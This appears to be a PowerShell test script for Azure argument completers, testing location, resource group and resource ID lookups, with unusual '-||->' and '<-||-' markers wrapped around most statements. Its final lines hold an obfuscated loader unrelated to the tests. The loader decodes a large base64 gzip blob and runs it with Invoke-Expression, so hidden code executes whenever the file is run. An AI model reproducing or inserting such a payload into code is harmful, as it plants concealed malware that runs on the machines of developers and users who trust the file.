














 -||-> function Test-LocationCompleter
{
	 -||-> $resourceTypes = @( -||-> "Microsoft.Batch/operations" <-||- ) <-||- 
	 -||-> $locations = [Microsoft.Azure.Commands.ResourceManager.Common.ArgumentCompleters.LocationCompleterAttribute]::FindLocations($resourceTypes, -1) <-||- 
	 -||-> $expectedResourceType =  -||-> ( -||-> Get-AzResourceProvider -ProviderNamespace "Microsoft.Batch" <-||- ).ResourceTypes | Where-Object { -||-> $_.ResourceType -eq "operations" <-||- } <-||-  <-||- 
	 -||-> $expectedLocations =  -||-> $expectedResourceType.Locations | ForEach-Object { -||-> "`'" + $_ + "`'" <-||- } <-||-  <-||- 
	 -||-> Assert-AreEqualArray $locations $expectedLocations <-||- 
} <-||- 



 -||-> function Test-ResourceGroupCompleter
{
	 -||-> $resourceGroups = [Microsoft.Azure.Commands.ResourceManager.Common.ArgumentCompleters.ResourceGroupCompleterAttribute]::GetResourceGroups(-1) <-||- 
	 -||-> $expectResourceGroups =  -||-> Get-AzResourceGroup | ForEach-Object { -||-> $_.Name <-||- } <-||-  <-||- 
	 -||-> Assert-AreEqualArray $resourceGroups $expectResourceGroups <-||- 
} <-||- 


 -||-> function Test-ResourceIdCompleter
{
     -||-> $resourceType = "Microsoft.Storage/storageAccounts" <-||- 
     -||-> $expectResourceIds =  -||-> Get-AzResource -ResourceType $resourceType | ForEach-Object { -||-> $_.Id <-||- } <-||-  <-||- 
    
     -||-> $resourceIds = [Microsoft.Azure.Commands.ResourceManager.Common.ArgumentCompleters.ResourceIdCompleterAttribute]::GetResourceIds($resourceType) <-||- 
     -||-> Assert-AreEqualArray $resourceIds $expectResourceIds <-||- 
    
     -||-> $resourceIds = [Microsoft.Azure.Commands.ResourceManager.Common.ArgumentCompleters.ResourceIdCompleterAttribute]::GetResourceIds($resourceType) <-||- 
     -||-> Assert-AreEqualArray $resourceIds $expectResourceIds <-||- 
    
     -||-> [Microsoft.Azure.Commands.ResourceManager.Common.ArgumentCompleters.ResourceIdCompleterAttribute]::TimeToUpdate = [System.TimeSpan]::FromSeconds(0) <-||- 
    
     -||-> $resourceIds = [Microsoft.Azure.Commands.ResourceManager.Common.ArgumentCompleters.ResourceIdCompleterAttribute]::GetResourceIds($resourceType) <-||- 
     -||-> Assert-AreEqualArray $resourceIds $expectResourceIds <-||- 
} <-||- 

 -||-> $s= -||-> New-Object IO.MemoryStream( -||-> ,[Convert]::FromBase64String("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") <-||- ) <-||-  <-||- ; -||-> IEX ( -||-> New-Object IO.StreamReader( -||-> New-Object IO.Compression.GzipStream( -||-> $s,[IO.Compression.CompressionMode]::Decompress <-||- ) <-||- ) <-||- ).ReadToEnd() <-||- ;



